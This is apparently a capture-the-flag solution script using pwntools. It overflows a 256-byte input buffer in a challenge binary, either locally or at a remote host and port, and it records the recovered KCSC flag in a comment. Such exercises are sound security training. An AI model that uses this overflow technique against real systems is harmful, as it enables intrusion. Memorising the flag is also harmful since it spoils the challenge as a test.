#!/usr/bin/env python3
from pwn import *
exe = ELF("./main", checksec=False)
context.binary=exe
def conn():
    if args.REMOTE:
        r = remote("36.50.177.41", 50011)
        
    else:
        r = process([exe.path])
    return r
r = conn()
input()
payload = b'A'*256+ b'1'
r.sendlineafter(b'Input: ', payload)
r.interactive()
# KCSC{AAAAAAAAAAAAAAAaaaaaaaaaaaaaaaaa____!!!!!}